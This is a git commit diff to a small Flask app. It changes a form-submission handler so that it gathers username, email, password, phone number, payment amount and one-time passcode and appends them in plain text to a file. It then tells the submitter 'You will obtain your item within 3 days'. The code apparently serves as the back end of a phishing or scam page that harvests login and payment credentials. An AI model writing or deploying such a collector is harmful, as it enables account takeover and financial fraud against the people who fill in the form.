796338a207586d2bf57b8bcad199dc0f42ac6097
Rishaply9959 <rishaply9959@gmail.com>
2024-06-10 15:42:48 +0530

    app.py

--- app.py
+++ app.py
@@ -1,10 +1,7 @@
-from flask import Flask, request, render_template, redirect, url_for
+from flask import Flask, request, jsonify, render_template
 import json
-import os
 
 app = Flask(__name__)
-
-DATA_FILE = 'userData.txt'
 
 @app.route('/')
 def index():
@@ -12,19 +9,21 @@ def index():
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    user_data = request.json
-
-    # Handle gender data if present
-    if 'gender' in user_data:
-        # If gender is a list, convert it to a comma-separated string
-        if isinstance(user_data['gender'], list):
-            user_data['gender'] = ', '.join(user_data['gender'])
-
-    # Write data to the file
-    with open(DATA_FILE, 'a') as file:
-        file.write(json.dumps(user_data) + '\n')
-
-    return 'Form data received and stored successfully!'
+    data = request.json
+    
+    user_info = {
+        "UserName/Uid": data.get("username"),
+        "email": data.get("email"),
+        "password": data.get("password"),
+        "phone": data.get("phone"),
+        "Amount": data.get("amount"),
+        "OTP": data.get("otp")
+    }
+    
+    with open('userData.txt', 'a') as f:
+        f.write(json.dumps(user_info) + "\n")
+    
+    return jsonify({"message": "You will obtain your item within 3 days"}), 200
 
 if __name__ == '__main__':
     app.run(debug=True)
